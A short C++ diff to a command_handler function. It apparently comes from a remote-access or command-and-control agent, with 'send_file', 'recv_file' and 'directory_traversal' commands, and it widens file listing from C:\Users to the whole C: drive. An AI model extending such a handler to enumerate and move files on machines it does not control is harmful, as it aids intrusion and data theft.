@@ -175,7 +175,7 @@ std::string command_handler(const std::string& command, const std::string& comma
     } else if (command == "send_file") {
     } else if (command == "directory_traversal") {
         Json::Value result;
-        getDirectoryContents("C:\\Users", result);
+        getDirectoryContents("C:\\", result);
         std::string output = result.toStyledString();
         return output;
     } else if (command == "recv_file") {
